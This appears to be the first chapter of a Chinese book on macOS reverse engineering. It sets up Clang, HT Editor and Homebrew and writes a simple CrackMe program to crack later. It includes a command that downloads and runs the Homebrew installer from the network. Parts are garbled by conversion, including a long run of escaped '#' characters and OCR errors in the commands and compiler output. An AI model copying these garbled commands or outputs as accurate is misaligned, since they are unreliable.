# 如何分析macOS软件

万事开头难。许多希望学习逆向工程的朋友通常在网上翻看了许多相关的博客和教程之后仍会觉得无从下手，第1章将会带你从头开始搭建一个最简单的分析环境，引导你自己动手写一个简单的CrackMe并破解它。

这一章不会介绍复杂的IDE，也不会使用各种“酷炫”的逆向工具，一切删繁就简，只使用命令行工具和简单的命令，来完成我们第一次Mac平台的逆向之旅，让你对逆向的过程有一个初步的认识。虽然目前在这个分析环境中只有几个命令行工具，但在后面的章节我们会不断地扩充。另外，Mac平台上的分析工具目前还不像Windows上那样种类繁多，所以我们还会自己开发一些实用的工具，添加到我们的分析环境中，使它变得更为充实。

### 1.1 分析环境搭建

首先，我们需要一个编译器来编译代码，目前在macOS系统上最流行的编译器自然是大名鼎鼎的Clang。

### 1.1.1 安装 Clang

如果你安装过Xcode，那说明你已经安装了Clang编译器，就可以先跳过本节。

Clang隶属于苹果公司的开源项目LLVM，是LLVM的一个前端，LLVM的官网为http://llvm.org，如图1-1所示。

你可以直接到LLVM官网下载编译好的Clang，但是这样下载Clang缺少一些必要的工具，使用起来很不方便，这些工具大部分跟Clang一样，包含在苹果的开发工具包中，这个工具包可以直接从App Store上下载。但是，还有更简便的方法。

首先打开一个终端，点击Launchpad→其他→终端，在终端中输入响起并回车，系统会自动检测到我们有没有安装Clang编译器，然后会提示我们是否下载并安装命令行开发者工具，如图1-2所示。

 </div>

选择 “安装”，就会出现安装协议，同意安装协议，过一会儿Clang编译器就会下载并安装到系统中了，一起安装的还有make等常用的命令行编译工具。我们可以执行Clang -v查看Clang是否安装正确。

$ clang -v
Apple LLVM version 7.0.0 (clang-700.1.76)
Target: x86_64-apple-Darwin14.5.0
Thread model: posix

如果能正确输出版本信息，则说明已经成功安装了Clang，接下来就可以使用它来编译程序了。

#### 1.1.2 HT Editor

HT Editor是一个开源跨平台的十六进制编辑器，但它的功能可远远不止十六进制编辑器这么简单，它还有强大的反汇编/汇编功能，支持x86、x64、ARM、Power等多种处理器，并支持Windows平台上的PE文件格式、Linux上的ELF格式以及macOS的Mach-O文件格式。我们在这里要用它来破解CrackMe。

HT Editor的官网为http://hte.sourceforge.net/，如图1-3所示(打开该网站可能需要国外的代理)。

 </div>

HT Editor官网只提供了Windows版本的二进制文件，在Mac上我们需要自己动手编译来生成它。不过不要担心，这并不是什么难事，在macOS上编译大多数开源项目跟在UNIX系统是一样的，基本上只需要“./configure && make”就可以了。

首先，点击Downloads超链接，下载最新版本的源代码，如图1-4所示。

 </div>

在写作本书时，HT的最新版本是2.1.0。点击“ht-2.1.0.tar.bz2”超链接下载源代码并将其解压缩到一个合适的目录，我将其解压到用户目录下的Project目录中。然后打开一个终端，使用cd命令切换到源代码所在的目录，然后在终端中执行./configure并回车，会看到大量的“checking”：

$ cd Project/ht-2.1.0/
$./configure
checking build system type... x86_64-apple-Darwin14.5.0
checking host system type... x86_64-apple-Darwin14.5.0
checking target system type... x86_64-apple-Darwin14.5.0
checking for a BSD-compatible install... /usr/bin/install -c
checking whether build environment is sane... yes
checking for a thread-safe mkdir -p... ./install-sh -c -d
checking for gawk... no
checking for mawk... no
checking for nawk... no
checking for awk... awk
checking whether make sets $(MAKE)... yes
checking whether make supports nested variables... yes

config.status: creating minilzo/Makefile
config.status: creating output/Makefile
config.status: creating tools/Makefile
config.status: creating config.h
config.status: config.h is unchanged
config.status: executing depfiles commands

./configure successful.

Configuration summary

X11 textmode support available: no
enable profiling: no
make a release build: yes
using included minilzo: yes

如果一切顺利，会在终端输出“./configure successful.”，表示已经成功生成了编译需要的makefile文件。

提示 如果读者安装了X11，需要将命令改为 ./configure --disable-x11-text-mode禁用X11 textmode的支持，否则可能会导致编译错误。

接下来输入make并回车，make程序会自动根据之前生成的makefile进行编译，并产生更多的编译输出。

$ make
/usr/bin/make all-recursive
Making all in tools
gcc -DHAVE_CONFIG_H -I. -I.. -DNOMACROS -O3 -fomit-frame-pointer -Wall -fsigned-char
-D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64 -MT bin2c.o -MD -MP -MF .deps/bin2c.Tpo -c -o bin2c.o
bin2c.c
bin2c.c:135:6: warning: variable 'inname' is used uninitialized whenever 'if' condition is false

[-Wsometimes-uninitialized]
if (argc >= x + 1) {
    A+++++
    bin2c.c:140:11: note: uninitialized use occurs here
    in=fopen(inname, "rb");
    A+++++
    bin2c.c:135:2: note: remove the 'if' if its condition is always true
    if (argc >= x + 1) {
        A+++++
        bin2c.c:125:14: note: initialize the variable 'inname' to silence this warning
        char *inname, *outname, *outname;
    1 warning generated.
    mv -f .deps/bin2c.Tpo .deps/bin2c.Po

mv -f .deps/htxexhead.Tpo .deps/htxexhead.Po
g++ -DHAVE_CONFIG_H -I. -I./analyser -I./asm -I./info -I./io/posix -I./io -I./output -I./eval -I.
-DNOMACROS -O3 -fomit-frame-pointer -Wall -fsigned-char -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
-Woverloaded-virtual -Whon-virtual-dtor -MT xexstruct.o -MD -MP -MF .deps/xexstruct.Tpo -c -o
xexstruct.o xexstruct.cc
mv -f .deps/xexstruct.Tpo .deps/xexstruct.Po
gcc -DHAVE_CONFIG_H -I. -I./analyser -I./asm -I./info -I./io/posix -I./io -I./output -I./eval -I.
-DNOMACROS -O3 -fomit-frame-pointer -Wall -fsigned-char -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
-MT cp-demangle.o -MD -MP -MF .deps/cp-demangle.Tpo -c -o cp-demangle.o cp-demangle.c
mv -f .deps/cp-demangle.Tpo .deps/cp-demangle.Po
g++ -DHAVE_CONFIG_H -I. -I./analyser -I./asm -I./info -I./io/posix -I./io -I./output -I./eval -I.
-DNOMACROS -O3 -fomit-frame-pointer -Wall -fsigned-char -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
-Woverloaded-virtual -Whon-virtual-dtor -MT htxeximg.o -MD -MP -MF .deps/htxeximg.Tpo -c -o htxeximg.o
htxeximg.cc

-D_FILE_OFFSET_BITS=64 -Woverloaded-virtual -Wnon-virtual-dtor -o ht atom.o except.o data.o str.o strtools.o endianess.o htdoc.o blockop.o cstream.o formats.o htanaly.o htapp.o htcfg.o htclipboard.o htcoff.o htcoffhd.o htctrl.o htdebug.o htdialog.o htelf.o htelfhd.o htelfimg.o htelfphs.o htelfshs.o htelfsym.o htelfrel.o htfinfo.o htformat.o hthex.o hthist.o htidle.o htiobox.o htle.o htleent.o htlehead.o htleimg.o htleobj.o htlepage.o htmenu.o htmz.o htmzhead.o htmzimg.o htmzrel.o htne.o htneent.o htnehead.o htnenms.o htneobj.o htnewexe.o htobj.o htpal.o htpe.o htpedimp.o htpeexp.o htpehead.o htpeimg.o htpeimp.o htperes.o htpereloc.o htreg.o htsearch.o httag.o httree.o main.o store.o stream.o tools.o vxd.o vxdserv.o cplus-dem.o regex.o syntax.o textfile.o textedit.o classread.o classview.o httext.o hteval.o relfile.o htprocess.o mfile.o elfstruc.o pestruct.o coff_s.o mzstruct.o defreg.o htdisasm.o htcoffimg.o nestruct.o htneimg.o htneimp.o cmds.o snprintf.o htpeil.o ilstruct.o log.o classimg.o vfs.o vfsview.o htlevxd.o lestruct.o htmacho.o htmachohd.o machostruc.o htmachoimg.o fltstruc.o htflt.o htflthd.o htfltimg.o xbestruct.o htxbehead.o htxbe.o htxbeimg.o htxbeimp.o pefstruc.o htpef.o htpefhd.o htpefimg.o htpefimp.o htxex.o htxexhead.o xexstruct.o cp-demangle.o htxeximg.o analyser/libanalyser.a asm/libasm.a info/libinfo.a io/posix/libhtio.a output/liboutput.a io/libcomio.a eval/libhteval.a -lncurses minilzo/liblzo.a

Clang会以彩色输出显示编译中的警告和错误，一般警告为鲜红色，错误为暗红色。编译完成后如果没有错误，就可以在源代码根目录中看到编译好的HT。

#### 1.1.3 Homebrew

很多时候，需要在系统中安装一些命令行工具与脚本，比如，安装wget或curl作为命令行下的下载工具，安装Git版本控制软件来管理工程的源代码。比较传统的安装方式是到这些软件的官网上下载编译好的程序，或者下载源代码进行编译，然后将程序放到一个目录下，将路径添加到PATH环境变量下，以后在终端中直接输入命令就可以使用它们。如果所有这些工具都使用这种方式安装，不但不方便进行管理，而且需要花费太多时间去搜索与安装它们。在主流的UNIX系统上，一般都有对这类软件进行统一管理的工具，如Ubuntu系统的apt-get，安装wget只需要在Ubuntu的终端中执行sudo apt-get install wget，就会在系统中自动安装wget。

苹果系统并没有提供这样的管理工具，但幸运的是，已经有第三方开发人员开发了这样的工具，并免费供用户使用。主流的有Homebrew与Macports，这里以Homebrew的使用为例。安装Homebrew只需要在终端中执行下面的代码即可：

$/usr/bin/ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"

执行后会产生如下输出：

==> This script will install:
/usr/local/bin/brew
/usr/local/share/doc/homebrew
/usr/local/share/man/man1/brew.1
/usr/local/share/zsh/site-functions/_brew
/usr/local/etc/bash_completion.d/brew
/usr/local/Homebrew
==> The following new directories will be created:
/usr/local/Cellar
/usr/local/Homebrew
/usr/local/Frameworks
/usr/local/bin
/usr/local/etc
/usr/local/include
/usr/local/lib
/usr/local/opt
/usr/local/sbin
/usr/local/share
/usr/local/share/zsh
/usr/local/share/zsh/site-functions
/usr/local/var

Press RETURN to continue or any other key to abort

==> /usr/bin/sudo /bin/mkdir -p /usr/local/Cellar /usr/local/Homebrew /usr/local/Frameworks

/usr/local/bin /usr/local/etc /usr/local/include /usr/local/lib /usr/local/opt /usr/local/sbin

/usr/local/share /usr/local/share/zsh /usr/local/share/zsh/site-functions /usr/local/var

WARNING: Improper use of the sudo command could lead to data loss or the deletion of important system files. Please double-check your typing when using sudo. Type "man sudo" for more information.

To proceed, enter your password, or type Ctrl-C to abort.

==> /usr/bin/sudo /bin/chmod g+rwx /usr/local/Cellar /usr/local/Homebrew /usr/local/Frameworks
/usr/local/bin /usr/local/etc /usr/local/include /usr/local/lib /usr/local/opt /usr/local/sbin
/usr/local/share /usr/local/share/zsh /usr/local/share/zsh/site-functions /usr/local/var
==> /usr/bin/sudo /bin/chmod 755 /usr/local/share/zsh /usr/local/share/zsh/site-functions
==> /usr/bin/sudo /usr/sbin/chown mbp /usr/local/Cellar /usr/local/Homebrew /usr/local/Frameworks
/usr/local/bin /usr/local/etc /usr/local/include /usr/local/lib /usr/local/opt /usr/local/sbin
/usr/local/share /usr/local/share/zsh /usr/local/share/zsh/site-functions /usr/local/var
==> /usr/bin/sudo /usr/bin/chgrp admin /usr/local/Cellar /usr/local/Homebrew /usr/local/Frameworks
/usr/local/bin /usr/local/etc /usr/local/include /usr/local/lib /usr/local/opt /usr/local/sbin
/usr/local/share /usr/local/share/zsh /usr/local/share/zsh/site-functions /usr/local/var
==> /usr/bin/sudo /bin/mkdir -p /Users/mbp/Library/Caches/Homebrew
==> /usr/bin/sudo /bin/chmod g+rwx /Users/mbp/Library/Caches/Homebrew
==> /usr/bin/sudo /usr/sbin/chown mbp /Users/mbp/Library/Caches/Homebrew
==> Searching online for the Command Line Tools
==> /usr/bin/sudo /usr/bin/touch /tmp/.com.apple.dt.CommandLineTools.installondemand.in-progress

在安装过程中会创建系统的目录与软链接，如果系统没有安装Command Line Tools，则会自动下载安装。安装完成后，执行brew doctor命令可以查看Homebrew的环境是否正常。通常在第一次安装brew之后，还需要安装苹果的Command Line Tools。如果事先安装过Xcode，Command Line Tools会在Xcode第一次启动时提示安装。

安装好Homebrew后，执行以下命令就可以安装指定的软件包。

##### $ brew install 软件包名

更新Homebrew所有的软件可以执行以下命令。

$ brew update
$ brew upgrade

卸载指定的软件包可以执行：

$ brew remove 软件包名

上一节介绍的HT Editor在Homebrew中也有移植版本，只需要执行以下命令即可自动安装。

$ brew install ht
=> Installing dependencies for ht: lzo
=> Installing ht dependency: lzo
=> Downloading https://homebrew.bintray.com/bottles/lzo-2.09.el_capitan.bottle.tar.gz
}\(\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#

Homebrew会依次下载安装HT Editor的依赖库，然后安装HT Editor并配置好它的路径，整个安装过程不需要用户手动干预，安装完成后，在终端下执行ht就可以打开HT Editor了。

此外，还有一个基于Homebrew的扩展工具Homebrew-Cask，使用它可以直接下载App Store中的GUI程序，安装Homebrew-Cask需要执行如下命令：

$ brew tap phinze/cask
$ brew install brew-cask

完成后就可以安装其他软件了，如安装腾讯的QQ聊天工具就可以执行如下命令：

$ brew cask install qq

如果你觉得在命令行下管理软件不够直观，可以尝试基于Homebrew移植的GUI版本CakeBrew，只需要到它的官网https://www.cakebrew.com下载安装即可。CakeBrew运行效果如图1-5所示。

 </div>

### 1.2 第一个 macOS 程序

现在我们已经装好了编译环境，并使用这个编译环境编译了一个开源项目，接下来就要用这个环境编写CrackMe了。

首先，我们需要一个编辑器编写代码。这里为了演示方便，选择的是系统自带的Vim编辑器，读者也可以自行选择其他方便的编辑器（后面会介绍更多实用的编辑器，本书附录的工具一览表中也会列出它们）。

我并不希望读者从一开始就陷入复杂的IDE的细节中，而是希望大家将重点放到代码的编写和逆向分析过程上。关于Xcode等IDE的使用，会在第3章讲解软件开发时进行详细的介绍。

首先，在Project文件夹下创建一个CrackMe01文件夹，里面存放编写的源代码以及编译结果：

$ cd Project
$ mkdir CrackMe01 && cd CrackMe01/

创建CrackMe的源代码文件cm01.c:

$vim cm01.c

这时可以看到出现了Vim的命令行界面，并且左下角有“"cm01.c" [New File]”的提示，此时在键盘上按“a”键进入编辑模式。“a”键表示在当前光标位置之后插入字符，之后就可以像正常编辑器一样输入代码了，但是需要注意的是，数字不能用小键盘输入。

#include <stdio.h>

int main()
{
    int secret = 0;
    printf("Please enter the secret num:");
    scanf("%d", &secret);
    if (secret != 123)
    {
        printf("Incorrect secret num.\n");
        return 0;
    }
    printf("Hello world!\n");
    return 0;
}

